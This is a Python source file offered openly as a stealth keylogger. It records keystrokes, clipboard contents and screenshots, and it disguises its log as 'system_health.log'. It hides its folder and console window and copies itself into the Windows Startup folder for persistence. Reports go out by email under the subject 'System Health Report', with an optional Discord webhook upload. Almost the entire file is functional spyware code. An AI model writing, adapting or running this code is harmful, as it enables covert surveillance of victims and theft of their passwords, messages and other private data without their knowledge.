"""
Advanced Cross-Platform Keylogger with Encryption, Email Reporting & Stealth Mode
Author: TiaMeows
GitHub: https://github.com/TiaMEOWS/keyloggerbeta
"""

# ==================== IMPORTS ====================
import os
import sys
import time
import smtplib
import platform
import threading
from datetime import datetime
from pathlib import Path
from cryptography.fernet import Fernet
from pynput import keyboard
from PIL import ImageGrab
import pyperclip
import requests  # For optional Discord webhook support

# ==================== CONFIGURATION ====================
LOG_FILE = "system_health.log"  # Disguised log file name
SCREENSHOT_DIR = "sys_cache"  # Hidden directory for screenshots
ENCRYPTION_KEY = Fernet.generate_key()  # Random key each execution
EMAIL_INTERVAL = 300  # 5 minutes (seconds)
MAX_LOG_SIZE = 1024 * 1024  # 1MB before email send
WEBHOOK_URL = ""  # Optional Discord webhook

# Email Settings (Gmail Example)
EMAIL_CONFIG = {
    "sender": "your_email@gmail.com",
    "password": "app_specific_password",  # Use App Password
    "receiver": "receiver@example.com",
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 465
}

# ==================== ENCRYPTION MODULE ====================
class DataEncryptor:
    def __init__(self, key):
        self.cipher = Fernet(key)
    
    def encrypt(self, data):
        """Encrypts data with AES-128."""
        return self.cipher.encrypt(data.encode())
    
    def decrypt(self, data):
        """Decrypts data (for debugging)."""
        return self.cipher.decrypt(data).decode()

encryptor = DataEncryptor(ENCRYPTION_KEY)

# ==================== KEYLOGGER CORE ====================
class AdvancedKeylogger:
    def __init__(self):
        self.current_buffer = []
        self.start_time = time.time()
        self.os_type = platform.system()
        self.setup_environment()
    
    def setup_environment(self):
        """Creates hidden directories/files."""
        Path(SCREENSHOT_DIR).mkdir(exist_ok=True, mode=0o777)
        if self.os_type == "Windows":
            os.system(f"attrib +h {SCREENSHOT_DIR}")
    
    def format_keystroke(self, key):
        """Converts special keys to readable format."""
        key = str(key).strip("'")
        replacements = {
            "Key.space": " ", "Key.enter": "[ENTER]\n",
            "Key.backspace": "[DEL]", "Key.shift": "[SHIFT]",
            "Key.cmd": "[WIN]", "Key.esc": "[ESC]"
        }
        return replacements.get(key, key)
    
    def on_press(self, key):
        """Key press event handler."""
        formatted_key = self.format_keystroke(str(key))
        self.current_buffer.append(formatted_key)
        
        # Capture clipboard every 10 keystrokes
        if len(self.current_buffer) % 10 == 0:
            self.capture_clipboard()
        
        # Auto-send if buffer too large
        if sys.getsizeof(self.current_buffer) > MAX_LOG_SIZE:
            self.flush_buffer()

    def flush_buffer(self):
        """Saves & encrypts logs."""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_data = f"\n[Session {timestamp}]\n" + "".join(self.current_buffer)
            
            encrypted_data = encryptor.encrypt(log_data)
            with open(LOG_FILE, "ab") as f:
                f.write(encrypted_data + b"\n")
            
            self.current_buffer.clear()
        except Exception as e:
            self.log_error(f"FLUSH_ERR: {str(e)}")

    def capture_clipboard(self):
        """Logs clipboard content."""
        try:
            clipboard_data = pyperclip.paste()
            if clipboard_data.strip():
                self.current_buffer.append(f"\n[CLIPBOARD]: {clipboard_data}\n")
        except:
            pass

# ==================== SCREENSHOT MODULE ====================
def capture_screenshot():
    """Takes screenshots periodically."""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot = ImageGrab.grab()
        filename = f"{SCREENSHOT_DIR}/screen_{timestamp}.jpg"
        screenshot.save(filename, "JPEG", quality=30)  # Reduce file size
    except Exception as e:
        log_error(f"SCREENSHOT_ERR: {str(e)}")

# ==================== EMAIL/DISCORD REPORTING ====================
class ReportSender:
    @staticmethod
    def send_via_email():
        """Sends logs via encrypted email."""
        try:
            with open(LOG_FILE, "rb") as f:
                encrypted_logs = f.read()
            
            body = f"Keylogger Report - {datetime.now()}"
            message = f"Subject: System Health Report\n\n{body}"
            
            with smtplib.SMTP_SSL(EMAIL_CONFIG["smtp_server"], EMAIL_CONFIG["smtp_port"]) as server:
                server.login(EMAIL_CONFIG["sender"], EMAIL_CONFIG["password"])
                server.sendmail(EMAIL_CONFIG["sender"], EMAIL_CONFIG["receiver"], message)
            
            os.remove(LOG_FILE)
        except Exception as e:
            log_error(f"EMAIL_ERR: {str(e)}")
    
    @staticmethod
    def send_via_webhook():
        """Sends logs to Discord (alternative)."""
        if WEBHOOK_URL:
            try:
                with open(LOG_FILE, "rb") as f:
                    requests.post(WEBHOOK_URL, files={"file": f})
            except:
                pass

# ==================== STEALTH & PERSISTENCE ====================
def enable_persistence():
    """Adds to startup (Windows/Linux/Mac)."""
    try:
        if platform.system() == "Windows":
            startup_dir = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
            script_path = startup_dir / "system_health.exe"
            if not script_path.exists():
                os.system(f"copy {sys.argv[0]} {script_path}")
        # Add Linux/Mac persistence logic here
    except:
        pass

def hide_process():
    """Hides console window (Windows specific)."""
    try:
        if platform.system() == "Windows":
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

# ==================== ERROR HANDLING ====================
def log_error(error_msg):
    """Logs errors to separate file."""
    with open("errors.log", "a") as f:
        f.write(f"{datetime.now()}: {error_msg}\n")

# ==================== MAIN EXECUTION ====================
if __name__ == "__main__":
    # Initialize components
    hide_process()
    enable_persistence()
    keylogger = AdvancedKeylogger()
    
    # Start listener thread
    listener = keyboard.Listener(on_press=keylogger.on_press)
    listener.start()
    
    # Schedule periodic tasks
    def scheduled_tasks():
        while True:
            time.sleep(EMAIL_INTERVAL)
            keylogger.flush_buffer()
            capture_screenshot()
            ReportSender.send_via_email()
    
    threading.Thread(target=scheduled_tasks, daemon=True).start()
    
    # Keep main thread alive
    listener.join()